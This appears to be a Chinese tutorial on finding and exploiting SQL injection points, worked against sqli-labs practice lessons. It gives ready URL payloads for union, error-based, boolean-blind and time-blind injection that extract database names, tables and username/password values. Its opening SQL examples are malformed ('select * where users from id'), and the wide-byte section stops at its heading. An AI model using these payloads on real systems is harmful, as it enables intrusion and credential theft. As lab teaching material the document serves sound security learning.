虽说现在有XIASQL\sqlmap，或者直接ai一把梭，但是什么、为什么、怎么做还是很有必要知道的。实际运用中，只需判断是否有注入点即可，也可深入判断是什么注入方式，再用sqlmap指定跑

先看三种型和对应后端代码  
数字型  
select * where users from id = 2-1  


字符型  
select * where users from id = '1'  


搜索型  
SELECT * FROM users WHERE username LIKE '%a%';

后端代码    
$id=$_GET['id'];  
$sql="SELECT * FROM users WHERE id='$id' ";  
$result=mysql_query($sql);  

-----
按照数据类型区分，分为数字型，字符型，搜索型  
按照回显方式区分，分为有回显的和没有回显的  
按照请求类型区分，分为GET注入，POST注入，Cookie注入等  

按照攻击方法分类  
联合查询注入 报错注入 布尔盲注 时间盲注 宽字节注入 堆叠注入 排序注入 请求头注入 二次注入

数字运算 ?id=1+1 ?id=2-1 ?id=1/0

字符串闭合 ?id=1 and '1'='1  ?id=1 and '1'='2'

搜索型 关键字%' and 1=1 and '%'='%  关键字%' and 1=2 and '%'='%

----
写在前面  
不同数据库，有不同打法：  
1. 报错信息识别（最直观）  
- MySQL：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version  
- SQL Server：Unclosed quotation mark / Incorrect syntax near  
- Oracle：ORA-XXXXX 开头的错误代码  
- PostgreSQL：ERROR: syntax error at or near

-----
下面逐一讲解    
输入任何字符都会报错，并且无法闭合  
<img width="1093" height="981" alt="image" src="https://github.com/user-attachments/assets/d41fc449-9cab-49aa-b3d2-1ab314fb7766" />
判断数字型闭合的方法：    
单引号闭合报错，双引号闭合报错，如果存在注入，很大可能是数字型  
可以进一步验证，通过and闭合    
id=2-1 --->结果和 id=1 正常      
id=1 and 1=1 --->结果和 id=1 正常   
id=1 and 1=2 --->结果和 id=1 不一样  
如果结果和上面一样就可以完全确定是数字型  
<img width="1089" height="1128" alt="image" src="https://github.com/user-attachments/assets/fc7ca9cc-3bb2-4443-b9f6-19b9d2f03da3" />

字符型注入点  
如果是 ' 型，你输入其他字符都不会报错，包括双引号，只有单引号才能让他报错  
<img width="1146" height="678" alt="image" src="https://github.com/user-attachments/assets/a9303972-d2a5-467f-ab41-9dfe241f3479" />

可以进一步验证  
通过 and 进行闭合就行
' and ''='   
' and '1'='1     
' and '  
' and #  
' and --+  
如果不报错，证明是 ' 注入

字符型 '' 闭合判定
奇数报错，偶数不报错，这种结合上面的字典配合返回内容更高效
<img width="1121" height="1280" alt="image" src="https://github.com/user-attachments/assets/ef403bdf-fbea-4043-a08c-15fd40065fe4" />

字符型注释闭合判定  
一般是两个： --+ 和 #  
要注意#号注释，在 GET 型号必须使用 URL 编码%23，否则无效！  
<img width="1101" height="731" alt="image" src="https://github.com/user-attachments/assets/95f15927-bce5-49f5-816f-3c762eaba5a3" />

------
上面知道了是什么类型的注入点和什么类型数据库，现在就要看具体用哪种方式注出库名：  
一、 联合注入  
联合查询注入是联合两个表进行同时查询。  
利用条件：  
1. 不报错时页面有数据回显 如user= password=   	
2. 查询字段数前后必须一致   	
3. 使其前条数据查询失败  
示例：  
#查询当前数据库版本
http://www.mysql.com/Less-1/?id=-1' union select 1,2,version()-- +
  
#查询当前数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,database()-- +

#查询所有数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(0x7e,schema_name,0x7e)  from  information_schema.schemata -- +

#查询指定数据库所有表数据
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- +

#查询指定数据库指定表的指定列的字段值
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(username ,0x7e, password) from users--+

这里的1，2，3占位符有多少，根据以下判断：  
1. ORDER BY 试列：?id=-1' order by 1--+ 逐个增大 N，直到报错（Unknown column '4'），说明超过列数，上一步的 N-1 就是列数。Less-1 中 order by 3 正常、order by 4 报错，所以是 3 列。  
2. union select 试错：union select 1--+ → union select 1,2--+ → union select 1,2,3--+，直到不报错即为列数匹配。  

二、 报错注入  
页面无回显，但报错时能够回显报错信息（可在报错字段注出数据库信息）    
十大报错函数：
floor()，extractvalue()，updatexml()，exp()，GeometryCollection()，polygon()，multipoint()，multilinestring()，linestring()，multipolygon()  

http://www.mysql.com/Less-5/?id=1  
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+  
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  

三、 布尔盲注  
之所以叫盲注，是因为在注入点报错后，不会暴露报错字段，只有正确和报错页面不同，且均无回显  
此时通过页面返回正确或者错误两个差异页面，来对我们想要查询的数据其进行判断  
http://www.mysql.com/Less-8/?id=1  

?id=1' union select 1,2,3 -- +  不报错->判定有三占位符  
?id=1' and(length(database()))=8 --+  数据库长度=8 则不报错  
?id=1' and (ascii(substr(database(),1,1)))=115 --+   substr(x,1,1)从x的第一个字符开始截取1位  
database()    //  security  
substr(security,1,1)   // s  
ascii(s)  //  115  

https://www.runoob.com/w3cnote/ascii.html  码表

四、 延时盲注  
当布尔盲注真假页面差异不明显时，就需要延时盲注判断  
利用if函数对查询语句进行判断，接着根据需求而设定对应的sleep函数数值。  
http://www.mysql.com/Less-9/?id=1  
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+  if第一个条件真，执行sleep(5) ，假则执行“3” 直接响应  

五、 宽字节注入  


